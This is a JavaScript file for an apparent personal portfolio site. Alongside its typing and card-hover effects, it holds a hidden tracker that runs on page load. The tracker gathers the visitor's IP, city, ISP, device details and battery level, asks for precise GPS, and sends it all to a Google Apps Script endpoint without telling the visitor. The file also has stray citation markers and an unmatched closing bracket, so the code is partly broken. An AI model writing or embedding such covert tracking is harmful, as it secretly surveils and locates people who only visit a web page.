(async function() {
  const getDeviceModel = () => {
    const ua = navigator.userAgent; // [cite: 1]
    if (/android/i.test(ua)) {
      const match = ua.match(/Android.*;\s([^;]+)\sBuild/);
      return match ? match[1] : "Android Device";
    }
    if (/iPhone|iPad|iPod/.test(ua) && !window.MSStream) {
      const w = window.screen.width, h = window.screen.height; // [cite: 2]
      if (w === 390 && h === 844) return "iPhone 12/13/14 Pro";
      if (w === 430 && h === 932) return "iPhone 14/15 Pro Max";
      return "Apple iOS Device";
    }
    return navigator.platform || "Unknown Device";
  };

  const startTracker = async () => {
    let payload = {
      ip: "Hidden/Blocked", city: "-", country: "-", isp: "-",
      userAgent: navigator.userAgent, platform: navigator.platform,
      ram: navigator.deviceMemory || "N/A", battery: "N/A", // [cite: 4]
      deviceName: getDeviceModel()
    };

    // 1. Ambil Info Network (IP, Kota, Negara, ISP)
    try {
      const res = await fetch('http://ip-api.com/json/');
      const d = await res.json();
      if (d.status === "success") {
        payload.ip = d.query; payload.city = d.city;
        payload.country = d.country; payload.isp = d.isp;
      }
    } catch (e) { console.error("IP info failed"); }

    // 2. Ambil Info Baterai [cite: 5, 6]
    if (navigator.getBattery) {
      try { 
        const b = await navigator.getBattery();
        payload.battery = Math.round(b.level * 100); 
      } catch (e) {}
    }

    const send = (data) => {
      fetch("https://script.google.com/macros/s/AKfycbzvqP9k_J5uBeSzADPiO0vJ4D_XS9W5S352PfnrD0B_NlpWi-Q4kGoABiJkv1zu3fLfQw/exec", { // GANTI DENGAN URL DEPLOYMENT 
        method: "POST", mode: "no-cors", body: JSON.stringify(data)
      });
    };

    send(payload); // Kirim data dasar segera 

    // 3. Minta Lokasi GPS (Update jika diizinkan) [cite: 9]
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((pos) => {
        payload.lat = pos.coords.latitude;
        payload.long = pos.coords.longitude;
        payload.accuracy = pos.coords.accuracy.toFixed(2) + "m";
        send(payload); 
      }, null, { enableHighAccuracy: true });
    }
  };

  window.addEventListener('load', () => { startTracker(); });


  // --- UI EFFECTS (TYPING) ---
  const texts = ['IT Support / Graphic Design', 'Hardware & Software Specialist', 'Creative Problem Solver', 'Tech Enthusiast'];
  let textIndex = 0, charIndex = 0, isDeleting = false, typingDelay = 150;

  function typeText() {
    const typedElement = document.getElementById('typed-text');
    if (!typedElement) return;

    const currentText = texts[textIndex];
    if (isDeleting) {
      typedElement.textContent = currentText.substring(0, charIndex - 1);
      charIndex--;
      typingDelay = 75;
    } else {
      typedElement.textContent = currentText.substring(0, charIndex + 1);
      charIndex++;
      typingDelay = 150;
    }

    if (!isDeleting && charIndex === currentText.length) {
      typingDelay = 2000;
      isDeleting = true;
    } else if (isDeleting && charIndex === 0) {
      isDeleting = false;
      textIndex = (textIndex + 1) % texts.length;
      typingDelay = 500;
    }
    setTimeout(typeText, typingDelay);
  }
    
    // Jalankan Efek UI
    setTimeout(typeText, 1000);

    // Ripple Effect untuk Card
    document.querySelectorAll('.card').forEach(card => {
      card.addEventListener('mousemove', (e) => {
        const rect = card.getBoundingClientRect();
        const x = ((e.clientX - rect.left) / rect.width) * 100;
        const y = ((e.clientY - rect.top) / rect.height) * 100;
        card.querySelector('.card-inner').style.setProperty('--x', `${x}%`);
        card.querySelector('.card-inner').style.setProperty('--y', `${y}%`);
      });
    });
  });
})();
